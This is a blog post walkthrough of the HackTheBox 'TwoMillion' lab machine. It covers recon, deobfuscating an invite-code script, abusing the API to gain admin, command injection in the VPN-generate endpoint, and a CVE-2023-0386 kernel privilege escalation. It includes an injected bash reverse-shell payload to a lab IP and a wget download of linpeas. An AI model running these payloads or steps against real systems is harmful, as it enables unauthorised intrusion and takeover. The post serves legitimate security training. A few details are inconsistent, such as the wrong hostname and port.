@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  TwoMillion HTB Walkthrough · Chief Dennis&#39; Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Dennis Drebitca">
+<meta name="description" content="The TwoMillion HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Command Injection- Burpsuite- CVE-2023-0386- JS deobfuscation with Cyberchef- API enumerationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.221 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:">
+<meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="TwoMillion HTB Walkthrough"/>
+<meta name="twitter:description" content="The TwoMillion HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Command Injection- Burpsuite- CVE-2023-0386- JS deobfuscation with Cyberchef- API enumerationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.221 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:"/>
+
+<meta property="og:title" content="TwoMillion HTB Walkthrough" />
+<meta property="og:description" content="The TwoMillion HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Command Injection- Burpsuite- CVE-2023-0386- JS deobfuscation with Cyberchef- API enumerationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.221 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chiefdennis.github.io/posts/htb_twomillion/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-27T13:07:16+01:00" />
+<meta property="article:modified_time" content="2023-11-27T13:07:16+01:00" />
+
+
+
+
+
+
+<link rel="canonical" href="https://chiefdennis.github.io/posts/htb_twomillion/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.e1bdf152d93b060b06ba5d496486ed9c201a8b95d335e035beb5faebe3b61cad.css" integrity="sha256-4b3xUtk7BgsGul1JZIbtnCAai5XTNeA1vrX66&#43;O2HK0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Chief Dennis&#39; Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">HTB Machines</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://chiefdennis.github.io/posts/htb_twomillion/">
+              TwoMillion HTB Walkthrough
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2023-11-27T13:07:16&#43;01:00">
+                November 27, 2023
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              6-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa fa-user" aria-hidden="true"></i>
+    <a href="/authors/dennis-drebitca/">Dennis Drebitca</a></div>
+
+          
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/cve-2023-0386/">CVE-2023-0386</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/cyberchef/">Cyberchef</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/command-injection/">Command-Injection</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/js-deobfuscation/">JS deobfuscation</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/api-enumeration/">API enumeration</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><img src="Screenshot_20.png" alt="image"></p>
+<p>The TwoMillion HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:</p>
+<pre><code>- Command Injection
+- Burpsuite
+- CVE-2023-0386
+- JS deobfuscation with Cyberchef
+- API enumeration
+</code></pre>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We start a broad Nmap scan by executing the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -T5 -vvv -p- 10.10.11.221 -Pn -oG nmap_inicial
+</span></span></code></pre></div><p>Where the arguments mean:</p>
+<pre><code>-sS: SYN port scan
+-T5: Using timing template 5 of NMAP
+-vvv: Triple verbose so NMAP prints a lot of information
+-p-: All ports are scanned
+-Pn: Skips Host Discovery
+-oG: Grep Format
+</code></pre>
+<p>The scan returns the following information:</p>
+<p><img src="Screenshot_1.png" alt="image"></p>
+<p>It looks like ports 20 and 80 are open. Classic open ports for SSH and https. Next, we run a more comprehensive scan on the open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sCV -p22,80 10.10.11.221 -oN nmap_exhaustivo -v
+</span></span></code></pre></div><p>Now the arguments used mean:</p>
+<pre><code>-sCV: Launches all scanning scripts to discover services and versions running on these ports
+-oN: Normal output format
+-v: Single verbose
+</code></pre>
+<p>The results for this second scan are the following:</p>
+<p><img src="Screenshot_2.png" alt="image"></p>
+<p>The usuall SSH and HTTP ports are open. Now lets try to enumerate subdirectories via brute force with Feroxbuster. First, we add the website to our /etc/hosts file and then we run the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">feroxbuster -u http://clicker.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span></code></pre></div><p>While FeroxBuster runs, lets take a look at the webpage hosted:</p>
+<p><img src="Screenshot_3.png" alt="image"></p>
+<p>There is nothing of interest besides the login and Join HTB buttons.</p>
+<p><img src="Screenshot_4.png" alt="image"></p>
+<p>The login page isnt useful since we dont have access credentials, and would have to bruteforce the password. Lets look for some more low hanging fruit to see if we can register somehow.</p>
+<p>There is a /register webpage, but we need an invite code. Trying to access it anyways, returns an error. But im curious how these invite codes are generated and/or stored.</p>
+<p><img src="Screenshot_5.png" alt="image"></p>
+<p>There is an interesting js file named inviteapi.min.js that contains the following code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">k</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span><span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">)};</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span><span class="nb">String</span><span class="p">)){</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="nx">d</span><span class="p">[</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">)]</span><span class="o">=</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">||</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">)}</span><span class="nx">k</span><span class="o">=</span><span class="p">[</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">]}];</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span><span class="s1">&#39;\\w+&#39;</span><span class="p">};</span><span class="nx">c</span><span class="o">=</span><span class="mi">1</span><span class="p">};</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]){</span><span class="nx">p</span><span class="o">=</span><span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\\b&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">),</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])}}</span><span class="k">return</span> <span class="nx">p</span><span class="p">}(</span><span class="s1">&#39;1 i(4){h 8={&#34;4&#34;:4};$.9({a:&#34;7&#34;,5:&#34;6&#34;,g:8,b:\&#39;/d/e/n\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&#34;7&#34;,5:&#34;6&#34;,b:\&#39;/d/e/k/l/m\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}&#39;</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="s1">&#39;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">,{}))</span>
+</span></span></code></pre></div><p>It looks like obfuscated js code. Lets try to deobfuscate it to see what it does. I have found <a href="https://lelinhtinh.github.io/de4js/"  class="external-link" target="_blank" rel="noopener">this</a> JavaScript deobfuscator which gave the following output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">verifyInviteCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;code&#34;</span><span class="o">:</span> <span class="nx">code</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="o">:</span> <span class="nx">formData</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/api/v1/invite/verify&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">makeInviteCode</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/api/v1/invite/how/to/generate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>From the beautified code, we can see that the makeInviteCode() function makes a POST request to /api/v1/invite/how/to/generate. Lets try to see what happens if we do a POST request ourselves with curl.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://2million.htb/api/v1/invite/how/to/generate
+</span></span></code></pre></div><p><img src="Screenshot_6.png" alt="image"></p>
+<p>The response is the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;0&#34;</span>:200,<span class="s2">&#34;success&#34;</span>:1,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&#34;</span>,<span class="s2">&#34;enctype&#34;</span>:<span class="s2">&#34;ROT13&#34;</span><span class="o">}</span>,<span class="s2">&#34;hint&#34;</span>:<span class="s2">&#34;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>It is a encrypted output, and the encryption type is ROT13. <a href="https://wiki.linuxquestions.org/wiki/Rot13#:~:text=rot13%20is%20a%20text%20scrambling,%2C%20B%20becomes%20O%2C%20etc."  class="external-link" target="_blank" rel="noopener">Here</a> we can find more information about the ROT13 encryption. Each character is shifted forward 13 times. To decode it, we can use <a href="" >this</a> website. The output is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">In order to generate the invite code, make a POST request to <span class="se">\/</span>api<span class="se">\/</span>v1<span class="se">\/</span>invite<span class="se">\/</span>generate
+</span></span></code></pre></div><p>We can delete the escape characters and make another POST request with curl.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -X POST http://2million.htb/api/v1/invite/generate 
+</span></span></code></pre></div><p><img src="Screenshot_7.png" alt="image"></p>
+<p>The data received is also encoded, this time in base64. To decode it, we can just run base64 -d on our terminal:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Qlk3MVQtR1FMVzktUkROM0UtQThPOUg=&#34;</span> <span class="p">|</span> base64 -d
+</span></span></code></pre></div><p>The output is BY71T-GQLW9-RDN3E-A8O9H. Lets try to register now with this invite code.</p>
+<p><img src="Screenshot_8.png" alt="image"></p>
+<p>And it worked!!</p>
+<p>Now lets see if we can access /api/v1 now that we are logged in.</p>
+<p><img src="Screenshot_9.png" alt="image"></p>
+<p>It lists the api endpoints avaliable. Maybe there are more, but we will work with these now.</p>
+<p>There is a endpoint that checks if we are admin. Unfortunately, it returns false because we are not admin. There is also a /api/v1/admin/settings/update with the PUT method. We can try to make us admins. The requests were made using BurpSuite.</p>
+<p><img src="Screenshot_10.png" alt="image"></p>
+<p>We can try to specify the content type as json:</p>
+<p><img src="Screenshot_11.png" alt="image"></p>
+<p>Now we need to add the parameter email into the request.</p>
+<p><img src="Screenshot_12.png" alt="image"></p>
+<p>Now we need the parameter is-admin and set it to true.</p>
+<p><img src="Screenshot_13.png" alt="image"></p>
+<p>Well, it looks like it wants a 0 or a 1, so we will put on a 1.</p>
+<p>The complete request looks like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">PUT /api/v1/admin/settings/update HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 2million.htb
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=6s1sblkhjjpoq9t9ms5b8pv48b
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Content-Length: 53
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">&#34;email&#34;: &#34;dennis@dennis.com&#34;,
+</span></span><span class="line"><span class="cl">&#34;is_admin&#34;: 1
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>Now we have to look at what api endpoint we can exploit to get initial access to the system.</p>
+<h2 id="initial-access">
+  Initial access
+  <a class="heading-link" href="#initial-access">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>A logical one to try is /api/v1/admin/vpn/generate. It has access to the underlaying system. We can try to inject some JSON data into the POST request:</p>
+<p><img src="Screenshot_14.png" alt="image"></p>
+<p>We now set a value key pair, and try to execute a reverse shell on the machine. It is successful.</p>
+<p><img src="Screenshot_15.png" alt="image"></p>
+<p>The full request is the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">POST /api/v1/admin/vpn/generate HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 2million.htb
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=6s1sblkhjjpoq9t9ms5b8pv48b
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Content-Length: 79
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    &#34;username&#34;: &#34;; bash -c &#39;bash -i &gt;<span class="err">&amp;</span> /dev/tcp/10.10.14.160/1234 0&gt;<span class="err">&amp;</span>1&#39;&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><h2 id="user-escalation-from-www-data-to-admin">
+  User escalation from www-data to admin
+  <a class="heading-link" href="#user-escalation-from-www-data-to-admin">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Now that we have have foothold in the system, lets look for any file that might be interesting. Using grep, we can search for any file containing the &ldquo;pass&rdquo; string:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">grep -arin -o -E <span class="s1">&#39;(\w+\W+){0,10}pass(\w+\W+){0,10}&#39;</span> .
+</span></span></code></pre></div><p><img src="Screenshot_16.png" alt="image"></p>
+<p>There is a .env file that contains the user and password for the database running. It is also the password for the user admin.</p>
+<p><img src="Screenshot_17.png" alt="image"></p>
+<p>We also got the user flag located in the home directory.</p>
+<h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Lets try running linpeas to see what information it can scrape. First, we set up on our machine a simple http server using python on port 5555.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 -m http.server <span class="m">5555</span>
+</span></span></code></pre></div><p>And then we use wget on the remote machine to download it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget 10.10.15.1:5555/linpeas.sh
+</span></span></code></pre></div><p><img src="Screenshot_18.png" alt="image"></p>
+<p>It looks like there are some e-mails present. Lets check them out.</p>
+<p><img src="Screenshot_19.png" alt="image"></p>
+<p>In this message we get a hint - maybe the underlaying linux kernel has not been updated recently and there are some known vulnerabilities we can take advante of.</p>
+<p>The current version of linux running in the machine is Linux 5.15.70-051570-generic.</p>
+<p>Researching the web, the kernel might be vulnerable to CVE-2023-0386. Citing NIST: &ldquo;A flaw was found in the Linux kernel, where unauthorized access to the execution of the setuid file with capabilities was found in the Linux kernel’s OverlayFS subsystem in how a user copies a capable file from a nosuid mount into another mount. This uid mapping bug allows a local user to escalate their privileges on the system.<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0386"  class="external-link" target="_blank" rel="noopener"></a>&rdquo;</p>
+<p>To execute the exploit, we download the git PoC by <a href="https://github.com/xkaneiki/CVE-2023-0386"  class="external-link" target="_blank" rel="noopener">xkaneiki</a> as a zip file, and then copy it using the simple python http server.</p>
+<p>Once copied and extracted with unzip, all we have to do is compile and run the exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">make all
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./fuse ./ovlcap/lower ./gc
+</span></span></code></pre></div><p><img src="Screenshot_21.png" alt="image"></p>
+<p>Then we have to open another window, this time connecting to the machine via ssh:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ssh admin@2million.htb
+</span></span></code></pre></div><p>And then running the last part of the exploit.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./exp.c
+</span></span></code></pre></div><p>Now we are root and read the root flag.</p>
+<p><img src="Screenshot_22.png" alt="image"></p>
+<p>Pwned!!</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2023 -
+    
+    2024
+     Dennis Drebitca 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
